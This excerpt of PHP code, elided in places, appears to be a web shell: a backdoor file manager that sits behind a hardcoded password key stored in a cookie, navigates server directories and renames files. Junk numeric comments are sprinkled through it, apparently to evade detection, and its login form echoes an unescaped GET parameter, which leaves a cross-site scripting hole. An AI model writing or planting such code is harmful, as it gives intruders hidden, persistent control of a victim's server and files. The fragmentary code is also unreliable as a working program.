...
$auth_key = "331b3e1aefcffd452db92a2c1c61c525";
...
$pass = false;
if (isset($_COOKIE['pw_name_36347'])) {
    if(($_COOKIE['pw_name_36347']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_36347'])) {
        if(($_POST['pw_name_36347']) == $auth_key) {
            setcookie("pw_name_36347", $_POST['pw_name_36347']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_36347' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1727813601991703 1727813601658091 1727813601469456 1727813601399447
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1727813601991703 1727813601658091 1727813601469456 1727813601399447
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1727813601991703 1727813601658091 1727813601469456 1727813601399447
            $name = PATH . "/" . $_GET['r'];
